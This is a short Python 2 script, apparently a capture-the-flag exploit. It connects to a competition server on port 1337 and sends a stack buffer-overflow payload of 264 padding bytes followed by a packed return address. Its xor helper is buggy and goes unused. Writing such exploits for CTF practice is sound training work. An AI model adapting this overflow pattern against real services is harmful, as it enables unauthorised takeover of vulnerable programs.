#!python2
import socket
from struct import pack

def client(host, port, payload):
    sock = socket.socket()
    sock.connect((host, port))
    for c in payload:
        sock.sendall(c)
        reply = sock.recv(1024)
	print reply, c
    sock.close()
    return

def pad(i):
	return "a"*i

def le8b(i):
	return pack("<Q", i)

def hex_cleaner(h1):
    return h1.replace(' ','').replace('\n','').replace('#','').replace('/','')

def xor(x, y):
    x = bytearray.fromhex(x)
    y = bytearray.fromhex(y)
    ret = ''
    ii = 0
    print(x)
    print(y)
    for i in x :
        ret += chr(i^y[ii])
        while ii < len(y):
            ii += 1
    return ret


#<~~~~~~~~Payload~~~~~~~~~>
payload = ["2 \n", pad(264)+le8b(0x606061fd), "\n"]

client("motd.ctfcompetition.com", 1337, payload)
